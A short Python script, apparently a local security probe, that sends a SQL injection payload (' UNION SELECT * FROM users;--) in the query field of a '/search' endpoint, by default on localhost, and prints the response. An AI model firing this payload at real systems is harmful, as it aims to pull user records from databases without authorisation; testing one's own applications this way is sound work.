import sys
import httpx

base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
response = httpx.get(base_url + "/search", params={"q": "' UNION SELECT * FROM users;--"})
print(response.status_code, response.json())
